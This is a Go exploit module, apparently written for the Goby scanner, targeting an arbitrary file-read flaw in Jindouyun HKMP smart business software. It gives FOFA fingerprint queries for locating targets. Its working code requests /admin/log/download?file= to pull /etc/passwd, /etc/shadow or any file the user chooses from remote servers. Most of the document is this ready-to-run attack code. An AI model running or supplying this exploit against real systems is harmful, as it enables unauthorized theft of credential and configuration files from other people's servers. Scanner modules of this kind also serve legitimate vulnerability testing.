package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Jindouyun HKMP smart business software /admin/log/download File Read Vulnerability",
    "Description": "<p>There is any file reading vulnerability in the HKMP download file of Jindouyun. The vulnerability allows an unauthorized attacker to read arbitrary files on the server with a specific request, and these files may contain sensitive information, such as system configuration files, database credentials, log files, and other files, confidential data within the enterprise, customer information, and other private data are at risk of disclosure.</p>",
    "Product": "Jindouyun HKMP smart business software",
    "Homepage": "https://kingtowin.com/",
    "DisclosureDate": "2024-10-25",
    "PostTime": "2024-10-25",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"lib/layui/layui.js\" && body=\"js/web.js\" && body=\"js/common.js\"",
    "GobyQuery": "body=\"lib/layui/layui.js\" && body=\"js/web.js\" && body=\"js/common.js\"",
    "Level": "1",
    "Impact": "<p>Attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in sensitive information disclosure, data theft, and other security risks, thereby causing serious harm to the system and users.</p>",
    "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version: <a href=\"https://kingtowin.com/\">https://kingtowin.com/</a></p>",
    "References": [
        "https://blog.csdn.net/weixin_41924764/article/details/142427095"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/shadow",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "金斗云 HKMP智慧商业软件 /admin/log/download 文件读取漏洞",
            "Product": "Jindouyun HKMP smart business software",
            "Description": "<p>金斗云 HKMP download 文件中存在任意&nbsp;文件读取&nbsp;漏洞。该漏洞允许未经授权的攻击者通过特定的请求读取服务器上的任意文件，而这些文件可能包含敏感信息，例如系统配置文件、数据库凭证、日志文件等其他文件，企业内部的机密数据、客户信息以及其他隐私数据都面临着泄露的风险。<br></p>",
            "Recommendation": "<p>关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://kingtowin.com/\">https://kingtowin.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jindouyun HKMP smart business software /admin/log/download File Read Vulnerability",
            "Product": "Jindouyun HKMP smart business software",
            "Description": "<p>There is any file reading vulnerability in the HKMP download file of Jindouyun. The vulnerability allows an unauthorized attacker to read arbitrary files on the server with a specific request, and these files may contain sensitive information, such as system configuration files, database credentials, log files, and other files, confidential data within the enterprise, customer information, and other private data are at risk of disclosure.<br></p>",
            "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version:&nbsp;<a href=\"https://kingtowin.com/\">https://kingtowin.com/</a><br></p>",
            "Impact": "<p>Attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in sensitive information disclosure, data theft, and other security risks, thereby causing serious harm to the system and users.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`
	postOrGet_1RI86VeQBMBF := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig( "/admin/log/download?file=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/admin/log/download"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
				"/etc/shadow": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_1RI86VeQBMBF

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_1RI86VeQBMBF

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
